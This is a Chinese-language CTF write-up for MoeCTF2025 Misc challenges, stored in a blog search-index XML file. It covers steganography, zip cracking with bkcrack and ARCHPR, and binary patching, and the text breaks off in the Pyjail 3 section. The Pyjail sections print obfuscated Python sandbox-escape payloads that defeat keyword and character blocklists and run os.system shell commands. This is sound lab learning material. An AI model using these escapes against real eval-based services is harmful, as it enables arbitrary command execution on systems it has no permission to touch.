<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MoeCTF2025_Misc_wp</title>
      <link href="/2025/10/13/MoeCTF2025_Misc_wp/"/>
      <url>/2025/10/13/MoeCTF2025_Misc_wp/</url>
      
        <content type="html"><![CDATA[<h1 id="moectf2025_misc_wp">MoeCTF2025_Misc_wp</h1><blockquote><p>工具大赛罢了</p></blockquote><h2 id="环境配置">环境配置</h2><ul><li><strong>操作系统</strong>：<code>Windows 11</code>/<code>Ubuntu 22.04 LTS</code></li><li><strong>代码环境</strong>：<code>python</code></li><li><strong>乱七八糟的工具，写一题找一个</strong></li></ul><h2 id="misc入门指北">Misc入门指北</h2><blockquote><p>欢迎来到misc的世界^ _ ^</p></blockquote><p>打开PDF，查找<code>moectf</code>，复制隐藏的flag提交即可<strong>（注意拉到底）</strong>。</p><pre class="language-none"><code class="language-none">moectf&#123;We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!&#125;</code></pre><h2 id="rush">Rush</h2><blockquote><p>“冲刺，冲刺！”你正走在路上，耳边传来这样的声音，还没反应过来，就被撞倒了。</p><p>你费劲地爬起来，好像看到了什么信息，回过神来那人早已扬长而去，那我缺的这个道歉这块？</p></blockquote><p>拿到<code>gif</code>发现二维码，截图。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc1.jpg"></p><p>用<code>CQR</code>打开直接发现了隐藏<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;QR_C0d3s_feATUR3_eRror_c0RRECt10N&#125;</code></pre><h2 id="ez_lsb">ez_LSB</h2><blockquote><p>这是一张普通的图片，但是一个个像素看过去似乎有些蹊跷？</p></blockquote><p>题目已经告诉我们是图片<code>LSB</code>隐写，我们用<code>zsteg</code>检测下，但<code>flag</code>形式没有意义。</p><pre class="language-bash" data-language="bash"><code class="language-bash">dzc@dzc-virtual-machine:~/zsteg$ zsteg xidian.pngb1,r,lsb,xy         <span class="token punctuation">..</span> text: <span class="token string">"The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9"</span>b1,rgb,lsb,xy       <span class="token punctuation">..</span> file: TeX font metric data <span class="token punctuation">(</span><span class="token punctuation">\</span>002H <span class="token punctuation">\</span>002<span class="token punctuation">)</span>b1,rgba,msb,xy      <span class="token punctuation">..</span> file: OpenPGP Public Keyb2,bgr,msb,xy       <span class="token punctuation">..</span> file: Applesoft BASIC program data, first line number <span class="token number">128</span>b3,bgr,msb,xy       <span class="token punctuation">..</span> file: Lotus unknown worksheet or configuration, revision 0x8b4,r,lsb,xy         <span class="token punctuation">..</span> file: Targa image data - Map <span class="token punctuation">(</span><span class="token number">256</span>-4112<span class="token punctuation">)</span> <span class="token number">4096</span> x <span class="token number">65536</span> x <span class="token number">1</span> +4097 +257 - right <span class="token string">"<span class="token entity" title="\001">\001</span><span class="token entity" title="\020">\020</span><span class="token entity" title="\001">\001</span><span class="token entity" title="\020">\020</span><span class="token entity" title="\021">\021</span>"</span>b4,bgr,lsb,xy       <span class="token punctuation">..</span> file: Targa image data - Map <span class="token number">65536</span> x <span class="token number">1</span> x <span class="token number">16</span> +1</code></pre><p>我们用<code>cyberchef</code>尝试<code>base64</code>解码得到<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;LSB_1s_s0_1nt3rest1ng!!sj9wd&#125;</code></pre><h2 id="ez_锟斤拷">ez_锟斤拷????</h2><blockquote><p>E=hv在记事本里写下了一些神秘字符，</p><p>但是经过一通保存另存为的迷之操作之后文本文件里的东西全变成了乱码</p></blockquote><p>拿到了<code>flag.txt</code>文件，<code>UTF-8</code>错误由<code>GBK</code>解码所致，需要对此乱码（锟斤拷）进行处理。</p><pre class="language-python" data-language="python"><code class="language-python">garbled_text <span class="token operator">=</span> <span class="token string">"锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹"</span><span class="token comment"># 1.用 GBK 编码</span>gbk_bytes <span class="token operator">=</span> garbled_text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span> <span class="token comment"># 替换无法编码的字符</span><span class="token comment"># 2.用 UTF-8 解码</span>original_text <span class="token operator">=</span> gbk_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token comment"># 3.转成半角</span><span class="token keyword">import</span> unicodedata<span class="token keyword">def</span> <span class="token function">full_to_half</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>        unicodedata<span class="token punctuation">.</span>normalize<span class="token punctuation">(</span><span class="token string">'NFKC'</span><span class="token punctuation">,</span> char<span class="token punctuation">)</span>  <span class="token comment"># NFKC 标准化转换全角→半角</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> text    <span class="token punctuation">)</span>flag <span class="token operator">=</span> full_to_half<span class="token punctuation">(</span>original_text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> </code></pre><p>得到了输出</p><pre class="language-none"><code class="language-none">moectf&#123;EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww&#125;恭喜你得到弗拉格后面全?斤拷锟斤拷锟斤拷</code></pre><p>不知道何意味。取前面的<code>flag</code>部分提交即可。</p><h2 id="weird_photo">weird_photo</h2><blockquote><p>FLAG就在图中。什么，你说你看不见 FLAG？注意 CRC！</p></blockquote><p>提示图片的CRC校验值可能有误，我们用<code>pngcheck</code>检查下。</p><pre class="language-bash" data-language="bash"><code class="language-bash">pngcheck <span class="token parameter variable">-v</span> photo.png File: photo.png <span class="token punctuation">(</span><span class="token number">829531</span> bytes<span class="token punctuation">)</span>  chunk IHDR at offset 0x0000c, length <span class="token number">13</span>    <span class="token number">900</span> x <span class="token number">490</span> image, <span class="token number">24</span>-bit RGB, non-interlaced   CRC error <span class="token keyword">in</span> chunk IHDR <span class="token punctuation">(</span>computed d34d176f, expected b5a7bf8c<span class="token punctuation">)</span>ERRORS DETECTED <span class="token keyword">in</span> photo.png</code></pre><p>然后根据西电同学的经验，这个塔楼拍的不太完整，感觉是图片尺寸改掉了？我们用<code>010 Editor</code>编辑下。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc3.jpg"></p><p>搜索<code>b5a7bf8c</code>的位置，改成<code>d34d176f</code>（位置就在IHDR块数据开始的地方）。尺寸<code>384</code>和<code>1EA</code>用十六进制计算就是<code>900</code>和<code>490</code>，我们把高度<code>1EA</code>也改成<code>384</code>看看能不能显示<code>flag</code>。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc4.jpg"></p><pre class="language-none"><code class="language-none">moectf&#123;Image_Height_Restored&#125;</code></pre><h2 id="sstv">SSTV</h2><blockquote><p>识别并解码附件中使用的特殊通信协议，以获取隐藏信息。</p></blockquote><p>已经提示了我们<code>SSTV</code>编码，我们使用<code>RX-SSTV</code>工具，配置虚拟声卡，播放sstv.wav即可。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc5.jpg"></p><pre class="language-none"><code class="language-none">moectf&#123;d3codiNG_SStV-reQu1REs-PATI3nC3&#125;</code></pre><h2 id="encrypted_pdf">encrypted_pdf</h2><blockquote><p>I am so forgetful… So I will use a password that is simpleenough.</p></blockquote><p>加密的PDF，密码足够简单，爆破即可，我用的是在线网站<code>I Love PDF</code>。</p><p>解密后打开PDF，隐藏方式和入门指北一样，查找<code>moectf</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;Pdf_1s_r3a1ly_c0lor4ul!!ihdw&#125;</code></pre><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc2.jpg"></p><p><strong>啊啊啊啊啊啊啊啊啊啊啊SEC娘宝宝可爱捏~</strong></p><h2 id="捂住一只耳">捂住一只耳</h2><blockquote><p>一只手捂住耳朵 另一只手打开音乐 似乎听到了不一样的声音</p></blockquote><p>明显在暗示单声道与立体声，我们用<code>Audacity</code>工具观察并且分离出上方的声道。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc6.jpg"></p><p>像是有规律的声音，听了一下好像是<code>moise</code>密码，我们用在线网站解码一下就得到<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;HALF_RADIO_IN_XDU&#125;</code></pre><p><strong>我已经很久没有听到过半部电台的故事了…</strong></p><h2 id="enchantment">Enchantment</h2><blockquote><p>哇多么好的附魔啊</p><p>你把图片发了出去，但似乎附魔台上的文字有一些不对劲？</p></blockquote><p>得到了一个<code>pngpca</code>文件，我们用<code>wireshark</code>作流量分析。</p><p>用<code>http</code>过滤，发现了<code>post</code>方法上传的<code>enchantment.png</code>文件，我们导出分组字节流保存文件为<code>png</code>格式。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc7.jpg"></p><p>这是<code>minecraft</code>里的附魔台文字，我们去网上找一下换算图，一个个对过来就得到<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;now_you_have_mastered_enchanting&#125;</code></pre><h2 id="webrepo">WebRepo</h2><blockquote><p>这都是什么稀奇古怪的格式！？</p></blockquote><p>直译一下是“网络上的仓库”，但是得到了一个<code>webp</code>文件，好一个一语双关。</p><p>扫描二维码告诉我们用<code>binwalk</code>，检查了一下发现是<code>.rar</code>文件，解压出发现了隐藏的<code>.git</code>文件夹，和题目对上了，是个仓库（太对了，真是<code>WebRepo</code>），<code>flag</code>一定藏在提交信息中。</p><p>在该目录下打开终端输入<code>git show</code>，得到<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;B1NwA1K_ANd_g1t_R3seT-MaG1C&#125;</code></pre><h2 id="ez_ssl">ez_ssl</h2><blockquote><p>zero6six在网页内上传了一份秘密文件。望着浏览器提示的“连接安全，信息不会外泄”，他觉得万无一失。</p><p>但与此同时，他的浏览器却悄悄上传了另一份文件。现在把他电脑的抓包记录给你，你能破解他的秘密吗？</p></blockquote><p>得到了一个<code>pngpca</code>文件，我们用<code>wireshark</code>工具作流量分析。题目提示有“秘密文件”和“另一份文件”，我们应该要把两个都找到。</p><p><code>http</code>过滤查看<code>post</code>方法上传的文件，发现是<code>ssl.log</code>日志文件；而<code>html</code>文件显示进行了文件上传操作。</p><p>查了一下和<code>TLS</code>有关，配置<code>ssl.log</code>文件后发现了<code>http</code>过滤后的信息变多，有一个<code>zip</code>文件，我们把文件导出，发现里面存在<code>flag.txt</code>。</p><p>然！后！我就一直以为<code>ssl.log</code>或者其他地方藏了密码，用各种方式去试都不行……最后发现压缩包写了密码是<code>7</code>位纯数字。用工具<code>ARCHPR</code>直接爆破。</p><p>得到密码：<code>6921682</code>，解压压缩包得到<code>Ook</code>编码，找个在线网站解码一下得到<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;upI0@d-l0G_TO-DeCrYPT_uploAD&#125;</code></pre><h2 id="ez_png">ez_png</h2><blockquote><p>这张平平无奇的图片里藏着一个小秘密。秘密不在颜色中，而在文件的骨骼里。注意：某些数据段的长短似乎不太协调。</p></blockquote><p>对于图片结构，我们可以使用工具<code>pngcheck</code>。</p><pre class="language-none"><code class="language-none">File: ez_png.png (899069 bytes)  chunk IHDR at offset 0x0000c, length 13    900 x 600 image, 24-bit RGB, non-interlaced  chunk pHYs at offset 0x00025, length 9: 2835x2835 pixels&#x2F;meter (72 dpi)  chunk IDAT at offset 0x0003a, length 65524    zlib: deflated, 32K window, default compression  chunk IDAT at offset 0x1003a, length 65524  chunk IDAT at offset 0x2003a, length 65524  chunk IDAT at offset 0x3003a, length 65524  chunk IDAT at offset 0x4003a, length 65524  chunk IDAT at offset 0x5003a, length 65524  chunk IDAT at offset 0x6003a, length 65524  chunk IDAT at offset 0x7003a, length 65524  chunk IDAT at offset 0x8003a, length 65524  chunk IDAT at offset 0x9003a, length 65524  chunk IDAT at offset 0xa003a, length 65524  chunk IDAT at offset 0xb003a, length 65524  chunk IDAT at offset 0xc003a, length 65524  chunk IDAT at offset 0xd003a, length 46973  chunk IDAT at offset 0xdb7c3, length 38  chunk IEND at offset 0xdb7f5, length 0No errors detected in ez_png.png (18 chunks, 44.5% compression).</code></pre><p>发现有数据块不正常，用<code>binwalk</code>检查一下，直接拆出来了<code>zlib</code>文件，点开就得到了<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;h1DdEn_P4YlOaD_IN-Id4T&#125;</code></pre><h2 id="万里挑一">万里挑一</h2><blockquote><p>要想冲破封锁，寻得真谛，须从万把钥匙中找出唯一的答案</p></blockquote><p>递归解压脚本，并把所有密码写入<code>txt</code>（最后手动处理一下多余的提示）。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> tempfile<span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">extract_zips</span><span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> tempfile<span class="token punctuation">.</span>TemporaryDirectory<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> temp_dir<span class="token punctuation">:</span>        <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zip_ref<span class="token punctuation">:</span>            zip_ref<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>temp_dir<span class="token punctuation">)</span>            <span class="token keyword">for</span> item <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>temp_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>                item_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_dir<span class="token punctuation">,</span> item<span class="token punctuation">)</span>                <span class="token keyword">if</span> item<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>item_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out_f<span class="token punctuation">:</span>                            out_f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>                <span class="token keyword">elif</span> item<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.zip'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    extract_zips<span class="token punctuation">(</span>item_path<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    zip_path <span class="token operator">=</span> <span class="token string">"password.zip"</span>    output_file <span class="token operator">=</span> <span class="token string">"dic.txt"</span>    extract_zips<span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>然后用<code>ARCHPR</code>字典爆破，成功解压。</p><pre class="language-none"><code class="language-none">a296a5ec1385f394e8cb</code></pre><p>发现<code>明文.exe</code>和<code>flag.txt</code>，联想到<code>bkcrack</code>明文攻击（<a href="https://blog.csdn.net/qq_43007452/article/details/135607308">BugkuCTF：请攻击这个压缩包[WriteUP]-CSDN博客</a>）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"4d5a90000300000004000000ffff"</span> <span class="token operator">|</span> xxd <span class="token parameter variable">-r</span> <span class="token parameter variable">-p</span> <span class="token operator">></span> plain.binbkcrack <span class="token parameter variable">-C</span> flag.zip <span class="token parameter variable">-c</span> <span class="token string">"明文.exe"</span> <span class="token parameter variable">-p</span> plain.bin <span class="token comment"># 得到key1 key2 key3</span>bkcrack <span class="token parameter variable">-C</span> flag.zip <span class="token parameter variable">-k</span> eec878a3 6808e48f 3aa41bd8 <span class="token parameter variable">-U</span> new_flag.zip <span class="token number">123456</span> <span class="token comment"># 用新密码解密</span></code></pre><pre class="language-none"><code class="language-none">moectf&#123;Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad&#125;</code></pre><h2 id="encrypted_volume">Encrypted_Volume</h2><blockquote><p>找到钥匙，解开加密卷！</p></blockquote><p>用<code>01editor</code>打开，在最后一个文件块中找到了<code>PNG</code>，保留这一部分发现二维码，扫描找到密钥。</p><pre class="language-none"><code class="language-none">:@(s&lt;&quot;A3F:89x541Ux[&lt;</code></pre><p>用<code>veracrypt</code>挂载<code>Volume</code>文件，得到了<code>brainfuck</code>加密文件，解密一下即可。</p><pre class="language-none"><code class="language-none">moectf&#123;nOW_YoU-h4V3_UNlocKED-VOlumE&#125;</code></pre><h2 id="哈基米难没露躲">哈基米难没露躲</h2><blockquote><p>出题人哈基米音乐听多了(bushi</p></blockquote><p>看了半天，符号和词都有规律，<code>100pts</code>不至于自己解吧？我去网上搜了搜哈基米加密，还真有。</p><p>简直就是世界上最优美的加密啊。</p><p>https://lhlnb.top/hajimi/base64</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc8.jpg"></p><p>提示隐写，发现有零宽字符，需要再解密。https://330k.github.io/misc_tools/unicode_steganography.html</p><pre class="language-none"><code class="language-none">moectf&#123;1b8956b9-a423-4101-a1bd-65be33682c82&#125;</code></pre><h2 id="master">2048_master</h2><blockquote><p>大家都是2048高手吧，出题人准备了一点小礼物哦，玩玩游戏就能拿到flag^ _^</p></blockquote><p>游戏玩了下玩不出来，所以我选择<code>reverse</code>。</p><p>思路：找到比较 <code>&gt; 13</code>的指令并修改成<code>&gt; 1</code>。</p><pre class="language-none"><code class="language-none">cmp eax, 0Dh # 改成01h</code></pre><p><code>IDA</code>中的操作是：1.修改：<code>Edit</code> →<code>Patch program</code> →<code>Assemble</code>，2.保存：<code>Edit</code> →<code>Patch program</code> →<code>Apply patches to input file</code>。运行修改后的<code>.exe</code>后就得到了<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;Y0u_4re_a_2048_m4st3r!!!!r0erowhu&#125;</code></pre><h2 id="pyjail-0">Pyjail 0</h2><blockquote><p>A simple reader <del>(所以严格来说这题不算 Pyjail)</del></p><p>关于验证码，示例：Please enter the reverse of ‘GZUUAOIS’ to continue:SIOAUUZG</p><p>至于 flag 的位置？你可以参考 Web 第十二章（</p></blockquote><p><code>Pyjail</code>沙箱逃逸笔记：https://xz.aliyun.com/news/12093</p><p>想起了那个把我恶心坏的<code>web</code>第十二章了，在虚拟环境里。</p><p>文件路径：<code>/proc/self/environ</code>。</p><p>接下来我都在<code>windows</code>上用<code>netcat</code>连接，格式为<code>netcat localhost &lt;port&gt;</code>。</p><p>此题输入反转字符串和文件地址即得到：</p><pre class="language-none"><code class="language-none">moectf&#123;07a71386-d189-c798-f194-04229b0b07e7&#125;</code></pre><h2 id="pyjail-1">Pyjail 1</h2><blockquote><p>flag 位置在 /tmp 下</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code: "</span><span class="token punctuation">)</span>    <span class="token comment"># 过滤关键字</span>    forbidden_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> forbidden_keywords<span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> user_input<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Forbidden keyword detected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>keyword<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span></code></pre><p>我们可以用<strong>字节数组或字符编码</strong>来构造字符串，避免直接写<code>import</code>，想要执行如下代码我们可以改写：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag.txt'</span><span class="token punctuation">)</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag.txt'</span><span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">moectf&#123;77553abb-2b7a-2c71-1870-4c41d9778a64&#125;</code></pre><h2 id="pyjail-2">Pyjail 2</h2><blockquote><p>flag 位置在 /tmp 下</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code: "</span><span class="token punctuation">)</span>    <span class="token comment"># 过滤关键字</span>    forbidden_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> forbidden_keywords<span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> user_input<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Forbidden keyword detected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>keyword<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># 过滤特殊字符</span>    forbidden_chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> forbidden_chars<span class="token punctuation">:</span>        <span class="token keyword">if</span> char <span class="token keyword">in</span> user_input<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Forbidden character detected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span>    result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span></code></pre><p><strong>1. 使用<code>chr()</code>编码绕过字符过滤</strong></p><p>所有被禁止的字符（如<code>_</code>）和关键字都用<code>chr(ASCII码)</code>表示。</p><p><strong>2. 使用<code>getattr()</code>进行属性访问</strong></p><p>由于<code>.</code>被禁止，使用<code>getattr(object, attribute)</code>来访问属性。</p><p><strong>3.使用<code>globals()</code>和<code>__getitem__()</code>访问字典</strong></p><p>由于<code>[]</code>被禁止，使用：<code>dict[key]</code> →<code>dict.__getitem__(key)</code> →<code>getattr(dict, '__getitem__')(key)</code>。</p><pre class="language-none"><code class="language-none">__import__(&#39;os&#39;).system(&#39;cat &#x2F;tmp&#x2F;flag.txt&#39;)getattr(    getattr(        getattr(            getattr(                globals(),                &#39;__getitem__&#39;            )(&#39;__builtins__&#39;),            &#39;__dict__&#39;,            getattr(                globals(),                &#39;__getitem__&#39;            )(&#39;__builtins__&#39;)        ),        &#39;__getitem__&#39;    )(&#39;__import__&#39;)(&#39;os&#39;),    &#39;system&#39;)(&#39;cat &#x2F;tmp&#x2F;flag.txt&#39;)getattr(getattr(getattr(getattr(globals(), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)), chr(95)+chr(95)+chr(100)+chr(105)+chr(99)+chr(116)+chr(95)+chr(95), getattr(globals(), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95))), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)), chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))</code></pre><pre class="language-none"><code class="language-none">moectf&#123;59042fef-1e84-9185-fcbc-50168d5e02ba&#125;</code></pre><h2 id="pyjail-3">Pyjail 3</h2><blockquote><p>flag 位置在 /tmp 下</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code: "</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token comment"># Hint: When __builtins__ is None, you need to be more creative...</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Code executed successfully!"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Return value: 